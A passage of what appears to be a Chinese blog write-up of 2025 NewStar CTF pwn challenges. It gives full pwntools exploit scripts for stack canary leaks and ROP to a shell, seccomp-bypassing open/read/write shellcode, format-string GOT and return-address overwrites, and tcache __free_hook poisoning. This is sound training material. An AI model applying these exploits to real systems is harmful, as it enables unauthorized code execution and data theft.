+<p>于是多次调试发现泄露的地址最后5位永远相同，所以猜测其基地址位减去最后五位</p>
+<p>再次实现，getshell</p>
+<p>本题就是通过gdb调试找栈上数据用%p泄露canary和基地址</p>
+<p>再覆盖即可</p>
+<p>exp：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span><br>p = remote(&#x27;39.106.48.123&#x27;,45277)<br>elf = ELF(&#x27;./pwn&#x27;)<br>libc = ELF(&#x27;./libc.so.6&#x27;)<br><br>p.recvuntil(&#x27;说话!&#x27;)<br>p.sendline(b&#x27;%11$p&#x27;)<br>p.recvuntil(&#x27;\n&#x27;)<br>canary = p.recvline().strip()<br>print(canary)<br>canary = int(canary,16)<br>print(canary)<br>print(hex(canary))<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">gdb.attach(p)</span><br>p.sendline(b&#x27;%33$p&#x27;)<br>p.recvuntil(&#x27;\n&#x27;)<br>libc_start = p.recvline().strip()<br>print(libc_start)<br>libc_start = int(libc_start,16)<br>print(libc_start)<br>print(hex(libc_start))<br><br>libc_base = libc_start -0x29e40<br>print(hex(libc_base))<br>one_gadget = libc_base +0xebd43<br>rdi_ret = libc_base + 0x2a3e5<br>print(&quot;rdi_ret:&quot;,hex(rdi_ret))<br>system_addr = libc_base + libc.symbols[&#x27;system&#x27;]<br>bin_sh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))<br>print(rdi_ret)<br>print(&quot;system_addr:&quot;,hex(system_addr))<br>print(&quot;bin_sh_addr:&quot;,hex(bin_sh_addr))<br>print(hex(one_gadget))<br>print(hex(libc_base))<br>ret = 0x40101a<br>nop_ret = 0x40116f<br><br><br><br>p.recvline(&#x27;说话!&#x27;)<br>p.sendline(b&#x27;end&#x27;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">gdb.attach(p)</span><br>p.recvline(&#x27;复读机好像怪怪的，你有发现什么吗QwQ:&#x27;)<br>payload = b&#x27;a&#x27;*(40)+p64(canary)+b&#x27;a&#x27;*8  +p64(ret) + p64(rdi_ret) + p64(bin_sh_addr) + p64(system_addr)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="13-sandbox-plus"><a href="#13-sandbox-plus" class="headerlink" title="13.sandbox_plus"></a>13.sandbox_plus</h1><p>沙盒掉了</p>
+<p>59 (0x3B) - execve</p>
+<p>322 (0x142) - openat2</p>
+<p>2 (0x02) - open</p>
+<p>0 (0x00) - read</p>
+<p>1 (0x01) - write</p>
+<p>40 (0x28) - sendfile</p>
+<p>这里查看了某位师傅的blog<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xmiscx/p/18827064%EF%BC%8C%E6%84%9F%E8%B0%A2%E5%B8%88%E5%82%85%E6%80%BB%E7%BB%93">https://www.cnblogs.com/xmiscx/p/18827064，感谢师傅总结</a></p>
+<p>可以更换为openat，pread，writev，，再进行不断调试（记得自己本地写一个flag，调试时si进入call rdx，可以看到自己写入的指令</p>
+<p>exp：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br><br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span><br>p = remote(&#x27;39.106.57.152&#x27;,20480)<br><br>p.recvline(&#x27;please input a orw_plus function (also also after compile)&#x27;)<br><br>flag_name = b&#x27;./flag\x00\x00&#x27;<br><br>shellcode = f&quot;&quot;&quot;<br>    /* 存储文件名 */<br>    mov r12, &#123;u64(flag_name)&#125;<br>    mov [rsp], r12<br><br>    /* openat 打开文件 */<br>    mov rdi, -100<br>    mov rsi, rsp<br>    mov rdx, 0<br>    mov rax, 257<br>    syscall<br><br>    /* 保存文件描述符 */<br>    mov rbx, rax<br><br>    /* pread 读取文件 */<br>    mov rdi, rbx<br>    mov rsi, rsp<br>    mov rdx, 0x100<br>    mov r10, 0<br>    mov rax, 17<br>    syscall<br><br>    /* 保存读取长度 */<br>    mov r12, rax<br><br>    /* writev 输出 */<br>    sub rsp, 16<br>    lea rcx, [rsp+16]<br>    mov [rsp], rcx<br>    mov [rsp+8], r12<br>    mov rdi, 1<br>    mov rsi, rsp<br>    mov rdx, 1<br>    mov rax, 20<br>    syscall<br>	<br>	<br>&quot;&quot;&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">gdb.attach(p)</span><br>p.sendline(asm(shellcode))<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="14-memory"><a href="#14-memory" class="headerlink" title="14.memory"></a>14.memory</h1><p>程序将flag复制到一个内存并让我们在后面输入</p>
+<p>内存空间可执行</p>
+<p>有沙盒但是没有禁用write</p>
+<p>主要问题就是在跳转到那段区域前所有寄存器被清空</p>
+<p>但是跳转时rip一定不是空的</p>
+<p>所有这个地址整页打印出来即可</p>
+<p>exp：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import * <br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;) <br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span> <br>p = remote(&#x27;39.106.48.123&#x27;,32818) <br>elf = ELF(&#x27;./pwn&#x27;) <br><br><br>p.recvuntil(&#x27;&gt; &#x27;)<br>payload = &#x27;&#x27;&#x27;<br>	lea rsi, [rip + 0]<br>	and rsi, 0xfffffffffffff000<br>	mov rdx, 0x1000 <br>	mov rdi, 1<br>	mov rax, 1              <br>    syscall<br>	&#x27;&#x27;&#x27;<br>p.sendline(asm(payload))<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="15-fmt-and-got"><a href="#15-fmt-and-got" class="headerlink" title="15.fmt and got"></a>15.fmt and got</h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1761395257482-170bc548-63a3-4637-b845-558c82b0ec81.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>有个格式化字符串漏洞</p>
+<p>存在后门函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1761395287998-78e96e18-1404-4789-8d88-d4b7c401046c.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>所以思路就是格式化字符串覆盖got表地址</p>
+<p>多用gdb查看写入后栈具体结构，写入数据在栈上第几个参数，以及是否有进行对齐</p>
+<p>ps：这里有个小坑，printf之前已经输出34个字节了，%c里的数要改，且不能用fmt_str</p>
+<p>256是进行整数溢出</p>
+<p>exp：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br><br>context(arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span><br>elf = ELF(&#x27;./pwn&#x27;)<br>p = remote(&#x27;39.106.48.123&#x27;,27962)<br><br>puts_got = elf.got[&#x27;exit&#x27;]<br>cat_flag = &quot;0x401236&quot;<br>offset = 10<br><br>a = int(cat_flag[2:4],16)<br>b = int(cat_flag[4:6],16)<br>c = int(cat_flag[6:8],16)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">payload =b<span class="hljs-string">&#x27;aaaaaa&#x27;</span>+ fmtstr_payload(offset,&#123;puts_got: cat_flag&#125;)</span><br><br>payload1 = b&#x27;aaaaaa&#x27;<br>payload1 += b&#x27;%&#x27; + str((c-0x28+256)%256).encode() + b&#x27;c&#x27; + b&#x27;%16$hhn&#x27;<br>payload1 += b&#x27;%&#x27; + str((b-c+256)%256).encode() + b&#x27;c&#x27; + b&#x27;%17$hhn&#x27;<br>payload1 += b&#x27;%&#x27; + str((a-b+256)%256).encode() + b&#x27;c&#x27; + b&#x27;%18$hhn&#x27;<br><br>payload1 += b&#x27;a&#x27;*6<br><br>payload1 += p64(puts_got)+p64(puts_got+1)  + p64(puts_got+2) <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">gdb.attach(p)</span><br>p.sendline(payload1)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="16-复读机"><a href="#16-复读机" class="headerlink" title="16.复读机"></a>16.复读机</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br>p = remote(&#x27;39.106.48.123&#x27;,45277)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span><br><br>win = 0x1289<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">泄露PIE</span><br>p.recvuntil(&#x27;说话!&#x27;)<br>p.sendline(&#x27;%p&#x27;)<br>p.recvline()<br>pie = p.recvuntil(&#x27;\n&#x27;,drop=True)<br>pie = int(pie,16)<br>print(hex(pie))<br>base = pie - 0x4060<br>print(hex(base))<br>win_addr = base + win<br>print(hex(win_addr))<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">泄露栈</span><br>p.recvuntil(&#x27;说话!&#x27;)<br>p.sendline(&#x27;%6$p&#x27;)<br>p.recvline()<br>zhan = p.recvuntil(&#x27;\n&#x27;,drop=True)<br>zhan = int(zhan,16)<br>ret = zhan - 0xa8<br>print(hex(ret))    <br>rip = ((ret)&amp;0xffff)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">gdb.attach(p)</span><br><br>p.recvuntil(&#x27;说话!&#x27;)<br>payload1 = b&#x27;%&#x27; + str(rip).encode() + b&#x27;c%6$hn&#x27;<br>p.sendline(payload1)<br><br><br>a = ((win_addr)&amp;0xffff)<br>print(hex(a))<br>p.recvuntil(&#x27;说话!&#x27;)<br>payload2 = b&#x27;%&#x27; + str(a).encode() + b&#x27;c%26$hn&#x27;<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="17-note"><a href="#17-note" class="headerlink" title="17.note"></a>17.note</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span><br>p = remote(&#x27;39.106.48.123&#x27;,13059)<br>libc = ELF(&#x27;libc-2.27.so&#x27;)<br><br>def add(index,size,note):<br>	p.sendlineafter(&quot; &gt;&gt;&gt;&quot;,b&#x27;1&#x27;)<br>	p.sendlineafter(&quot;index:&quot;,str(index))<br>	p.sendlineafter(&quot;size:&quot;,str(size))<br>	p.sendlineafter(&quot;note:&quot;,note)<br>	<br>def rel(index):<br>	p.sendlineafter(&quot; &gt;&gt;&gt;&quot;,b&#x27;4&#x27;)<br>	p.sendlineafter(&quot;index:&quot;,str(index))<br>	<br>def show(index):<br>	p.sendlineafter(&quot; &gt;&gt;&gt;&quot;,b&#x27;3&#x27;)<br>	p.sendlineafter(&quot;index:&quot;,str(index))<br>	<br>def change(index,note):<br>	p.sendlineafter(&quot; &gt;&gt;&gt;&quot;,b&#x27;2&#x27;)<br>	p.sendlineafter(&quot;index:&quot;,str(index))<br>	p.sendlineafter(&quot;note:&quot;,note)<br>	<br>add(0,1280,b&#x27;aaaa&#x27;)<br>add(1,16,b&#x27;bbbb&#x27;)<br>rel(0)<br>show(0)<br><br>p.recvuntil(&#x27;note: &#x27;)<br>stack = u64(p.recv(8))<br>print(hex(stack))<br>base = stack - 0x3ebca0<br>print(hex(base))<br><br>one_gadget = base + 0x4f29e<br>free_hook = base + libc.sym[&#x27;__free_hook&#x27;]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">malloc_hook = base + 0x3ebc30</span><br>print(hex(free_hook))<br><br>system_addr = base + libc.symbols[&#x27;system&#x27;]<br>bin_sh_addr = base + next(libc.search(b&#x27;/bin/sh&#x27;))<br><br><br>rel(1)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">gdb.attach(p)</span><br>change(1,p64(free_hook))<br>add(2,16,p64(free_hook))<br>add(3,16,p64(system_addr))<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">gdb.attach(p)</span><br>add(4,16,b&#x27;/bin/sh&#x27;)<br>rel(4)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">gdb.attach(p)</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn/" class="category-chain-item">pwn</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/pwn/%E6%AF%94%E8%B5%9B/" class="category-chain-item">比赛</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2025newstar</div>
+      <div>https://yy-t1.github.io/2026/07/21/pwn/比赛/2025newstar/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>bsahfm</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年7月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/" title="2025moectf">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2025moectf</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/07/17/pwn/%E6%AF%94%E8%B5%9B/hack-the-box/" title="hack_the_box">
+                        <span class="hidden-mobile">hack_the_box</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"A72cL0RlIkmsXlCGMx51Qi51-gzGzoHsz","appKey":"xxsSPn2ge0tYPU7nwv5Gyd1r","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
